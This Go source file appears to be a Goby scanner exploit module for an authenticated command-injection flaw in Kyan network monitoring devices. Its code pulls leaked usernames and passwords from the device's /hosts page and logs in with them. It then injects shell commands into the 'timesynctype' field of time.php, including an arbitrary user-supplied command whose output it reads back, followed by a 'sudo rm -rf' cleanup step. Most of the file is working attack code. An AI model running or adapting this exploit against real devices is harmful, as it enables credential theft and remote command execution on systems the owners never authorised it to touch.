package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kyan Network monitoring time RCE",
    "Description": "Kyan network monitoring equipment time.php can execute arbitrary commands after authentication, and can obtain server permissions with the account password leaked by the host.",
    "Impact": "Kyan Network monitoring time RCE",
    "Recommendation": "There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: http://aiesec.cn/platform/",
    "Product": "Kyan-Design",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Kyan 网络监控设备 time.php 代码执行漏洞",
            "Description": "<p>Kyan 网络监控是一款安全监视和远程监控设备。</p><p>Kyan 网络监控设备存在远程代码执行漏洞，time.php可在经过身份验证的情况下执行任意命令, 配合host泄露的账号密码，可以获取服务器权限。</p>",
            "Impact": "<p>Kyan 网络监控设备存在远程代码执行漏洞，time.php可在经过身份验证的情况下执行任意命令, 配合host泄露的账号密码，可以获取服务器权限。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"http://aiesec.cn/platform\">http://aiesec.cn/platform</a></p>",
            "Product": "Kyan-Design",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Kyan Network monitoring time RCE",
            "Description": "Kyan network monitoring equipment time.php can execute arbitrary commands after authentication, and can obtain server permissions with the account password leaked by the host.",
            "Impact": "Kyan Network monitoring time RCE",
            "Recommendation": "There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: http://aiesec.cn/platform/",
            "Product": "Kyan-Design",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Login to Management Platform\"",
    "GobyQuery": "body=\"Login to Management Platform\"",
    "Author": "1291904552@qq.com",
    "Homepage": "http://aiesec.cn/platform/",
    "DisclosureDate": "2021-09-10",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Kyan-Design"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "8576"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/hosts"
			httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				userValue := regexp.MustCompile("UserName=(.*?)\n").FindStringSubmatch(resp1.RawBody)
				passValue := regexp.MustCompile("Password=(.*?)\n").FindStringSubmatch(resp1.RawBody)
				uri2 := "/login.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = true
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380")
				cfg2.Data = fmt.Sprintf(`user=%s&passwd=%s&x=0&y=0`, userValue[1], passValue[1])
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					if resp2.StatusCode == 200 {
						RandFileName := goutils.RandomHexString(4)
						uri3 := "/time.php"
						cfg3 := httpclient.NewPostRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg3.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D")
						cfg3.Data = fmt.Sprintf(`timesynctype=;sudo echo %s""bbbb >%s.txt`, RandFileName, RandFileName)
						if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
							if resp3.StatusCode == 200 {
								uri4 := "/" + RandFileName + ".txt"
								cfg4 := httpclient.NewGetRequestConfig(uri4)
								cfg4.VerifyTls = false
								if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
									uri5 := "/time.php"
									cfg5 := httpclient.NewPostRequestConfig(uri5)
									cfg5.VerifyTls = false
									cfg5.Header.Store("Content-Type", "application/x-www-form-urlencoded")
									cfg5.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D")
									cfg5.Data = fmt.Sprintf(`timesynctype=;sudo rm -rf %s.txt`, RandFileName)
									httpclient.DoHttpRequest(u, cfg5)
									return resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, RandFileName+"bbbb")
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/hosts"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				userValue := regexp.MustCompile("UserName=(.*?)\n").FindStringSubmatch(resp1.RawBody)
				passValue := regexp.MustCompile("Password=(.*?)\n").FindStringSubmatch(resp1.RawBody)
				uri2 := "/login.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = true
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380")
				cfg2.Data = fmt.Sprintf(`user=%s&passwd=%s&x=0&y=0`, userValue[1], passValue[1])
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					if resp2.StatusCode == 200 {
						RandFileName := goutils.RandomHexString(4)
						uri3 := "/time.php"
						cfg3 := httpclient.NewPostRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg3.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D")
						cfg3.Data = fmt.Sprintf(`timesynctype=;%s >%s.txt`, cmd, RandFileName)
						if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
							if resp3.StatusCode == 200 {
								uri4 := "/" + RandFileName + ".txt"
								cfg4 := httpclient.NewGetRequestConfig(uri4)
								cfg4.VerifyTls = false
								if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
									uri5 := "/time.php"
									cfg5 := httpclient.NewPostRequestConfig(uri5)
									cfg5.VerifyTls = false
									cfg5.Header.Store("Content-Type", "application/x-www-form-urlencoded")
									cfg5.Header.Store("Cookie", "PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D")
									cfg5.Data = fmt.Sprintf(`timesynctype=;sudo rm -rf %s.txt`, RandFileName)
									httpclient.DoHttpRequest(expResult.HostInfo, cfg5)
									expResult.Output = resp1.RawBody + "\n" + resp4.RawBody
									expResult.Success = true
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
